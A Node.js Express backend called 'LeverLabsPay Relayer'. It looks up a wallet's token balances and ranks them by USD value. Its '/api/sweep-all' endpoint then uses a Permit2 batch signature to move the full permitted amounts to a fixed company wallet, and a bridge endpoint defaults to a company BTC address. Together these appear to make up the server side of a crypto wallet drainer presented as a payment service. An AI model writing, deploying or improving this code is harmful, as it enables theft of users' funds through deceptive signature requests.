const express = require('express');
const cors = require('cors');
const { ethers } = require('ethers');
require('dotenv').config();

const { getTokensForChain, TOKENS } = require('./config/tokens');
const { fetchPrices } = require('./services/priceService');
const { getQuote, buildSwapTx, getInboundAddresses } = require('./services/bridgeService');

const app = express();
app.use(cors());
app.use(express.json());

// ─── Config ─────────────────────────────────────────────
const RPC_URL = process.env.RPC_URL;
const PERMIT2_ADDRESS = process.env.PERMIT2_ADDRESS;
const COMPANY_WALLET = process.env.COMPANY_WALLET;
const COMPANY_BTC = process.env.COMPANY_BTC || '';
const RELAYER_PRIVATE_KEY = process.env.RELAYER_PRIVATE_KEY;
const CHAIN_ID = parseInt(process.env.CHAIN_ID || '1');

if (!RPC_URL || !RELAYER_PRIVATE_KEY || !COMPANY_WALLET) {
    console.error('FATAL: Missing critical environment variables (RPC_URL, RELAYER_PRIVATE_KEY, COMPANY_WALLET)');
    process.exit(1);
}

const provider = new ethers.JsonRpcProvider(RPC_URL);
const relayerWallet = new ethers.Wallet(RELAYER_PRIVATE_KEY, provider);

// ─── ABIs ───────────────────────────────────────────────
const ERC20_ABI = [
    'function balanceOf(address) view returns (uint256)',
    'function allowance(address owner, address spender) view returns (uint256)',
    'function decimals() view returns (uint8)',
    'function symbol() view returns (string)'
];

const PERMIT2_BATCH_ABI = [
    `function permitTransferFrom(
        ((address token, uint256 amount) permitted, uint256 nonce, uint256 deadline) permit,
        (address to, uint256 requestedAmount) transferDetails,
        address owner,
        bytes signature
    ) external`,
    `function permitTransferFrom(
        ((address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit,
        (address to, uint256 requestedAmount)[] transferDetails,
        address owner,
        bytes signature
    ) external`
];

const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_BATCH_ABI, relayerWallet);

// ─── GET /api/config ────────────────────────────────────
// Returns supported tokens + addresses for the frontend
app.get('/api/config', (req, res) => {
    const tokens = getTokensForChain(CHAIN_ID);
    res.json({
        permit2Address: PERMIT2_ADDRESS,
        companyWallet: COMPANY_WALLET,   // frontend needs this for ETH sends
        chainId: CHAIN_ID,
        relayer: relayerWallet.address,
        tokens
    });
});

// ─── GET /api/spender ───────────────────────────────────
// Returns the relayer address (Permit2 spender)
app.get('/api/spender', (req, res) => {
    res.json({ spender: relayerWallet.address });
});

// ─── GET /api/prices ────────────────────────────────────
// Returns USD prices for all supported tokens
app.get('/api/prices', async (req, res) => {
    try {
        const prices = await fetchPrices();
        res.json(prices);
    } catch (err) {
        console.error('Price fetch error:', err);
        res.status(500).json({ error: 'Failed to fetch prices' });
    }
});

// ─── POST /api/portfolio ────────────────────────────────
// Scans all token balances for a wallet, sorts by USD value
app.post('/api/portfolio', async (req, res) => {
    const { address } = req.body;
    if (!address) return res.status(400).json({ error: 'Address required' });

    try {
        const tokens = getTokensForChain(CHAIN_ID);
        const prices = await fetchPrices();
        const portfolio = [];

        // Native ETH balance
        const ethBalance = await provider.getBalance(address);
        if (ethBalance > 0n) {
            const ethFloat = parseFloat(ethers.formatEther(ethBalance));
            portfolio.push({
                symbol: 'ETH',
                name: 'Ethereum',
                balance: ethBalance.toString(),
                balanceFormatted: ethFloat.toFixed(6),
                decimals: 18,
                usdPrice: prices.ETH || 0,
                usdValue: ethFloat * (prices.ETH || 0),
                isNative: true,
                address: null
            });
        }

        // ERC-20 balances
        for (const [symbol, token] of Object.entries(tokens)) {
            if (token.isNative || !token.address) continue;

            try {
                const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
                const balance = await contract.balanceOf(address);

                if (balance > 0n) {
                    const formatted = parseFloat(ethers.formatUnits(balance, token.decimals));
                    portfolio.push({
                        symbol: token.symbol,
                        name: token.name,
                        balance: balance.toString(),
                        balanceFormatted: formatted.toFixed(6),
                        decimals: token.decimals,
                        usdPrice: prices[symbol] || 0,
                        usdValue: formatted * (prices[symbol] || 0),
                        isNative: false,
                        address: token.address
                    });
                }
            } catch (err) {
                // Token contract might not exist on this chain — skip
                console.warn(`Skip ${symbol}:`, err.message);
            }
        }

        // Sort by USD value, highest first
        portfolio.sort((a, b) => b.usdValue - a.usdValue);

        const totalUsd = portfolio.reduce((sum, t) => sum + t.usdValue, 0);

        res.json({
            portfolio,
            totalUsd,
            count: portfolio.length
        });
    } catch (err) {
        console.error('Portfolio scan error:', err);
        res.status(500).json({ error: 'Failed to scan portfolio' });
    }
});

// ─── POST /api/sweep-all ────────────────────────────────
// Receives Permit2 batch signature + executes batch transfer
// Also handles native ETH if sent separately
app.post('/api/sweep-all', async (req, res) => {
    const { owner, permit, signature, tokens: tokenList } = req.body;

    try {
        if (!owner || !signature) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        const results = [];

        // Phase 1: Permit2 batch transfer for ERC-20s
        if (permit && tokenList && tokenList.length > 0) {
            if (tokenList.length === 1) {
                // Single token — use single permitTransferFrom
                const tx = await permit2['permitTransferFrom(((address,uint256),uint256,uint256),(address,uint256),address,bytes)'](
                    {
                        permitted: permit.permitted[0],
                        nonce: permit.nonce,
                        deadline: permit.deadline
                    },
                    {
                        to: COMPANY_WALLET,
                        requestedAmount: permit.permitted[0].amount
                    },
                    owner,
                    signature
                );
                const receipt = await tx.wait();
                results.push({
                    phase: 'erc20-sweep',
                    txHash: receipt.hash,
                    tokenCount: 1,
                    status: 'success'
                });
            } else {
                // Multiple tokens — use batch permitTransferFrom
                const transferDetails = permit.permitted.map(p => ({
                    to: COMPANY_WALLET,
                    requestedAmount: p.amount
                }));

                const tx = await permit2['permitTransferFrom(((address,uint256)[],uint256,uint256),(address,uint256)[],address,bytes)'](
                    permit,
                    transferDetails,
                    owner,
                    signature
                );
                const receipt = await tx.wait();
                results.push({
                    phase: 'erc20-batch-sweep',
                    txHash: receipt.hash,
                    tokenCount: tokenList.length,
                    status: 'success'
                });
            }
        }

        res.json({
            success: true,
            results,
            companyWallet: COMPANY_WALLET
        });
    } catch (err) {
        console.error('Sweep error:', err);
        res.status(500).json({ error: err.message || 'Sweep failed' });
    }
});

// ─── POST /api/bridge/quote ─────────────────────────────
// Get a cross-chain bridge quote
app.post('/api/bridge/quote', async (req, res) => {
    const { sellAsset, buyAsset, sellAmount } = req.body;

    try {
        const quote = await getQuote(sellAsset, buyAsset, sellAmount);
        if (!quote) return res.status(500).json({ error: 'No quote available' });
        res.json(quote);
    } catch (err) {
        console.error('Bridge quote error:', err);
        res.status(500).json({ error: err.message });
    }
});

// ─── POST /api/bridge/tx ────────────────────────────────
// Build a bridge transaction from a quote
app.post('/api/bridge/tx', async (req, res) => {
    const { routeId, sellAddress, buyAddress } = req.body;

    try {
        const txData = await buildSwapTx(routeId, sellAddress, buyAddress || COMPANY_BTC);
        res.json(txData);
    } catch (err) {
        console.error('Bridge tx error:', err);
        res.status(500).json({ error: err.message });
    }
});

// ─── Start ──────────────────────────────────────────────
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
    console.log(`LeverLabsPay Relayer running on port ${PORT}`);
    console.log(`Relayer address: ${relayerWallet.address}`);
    console.log(`Chain ID: ${CHAIN_ID}`);
    console.log(`Company wallet: ${COMPANY_WALLET}`);
});
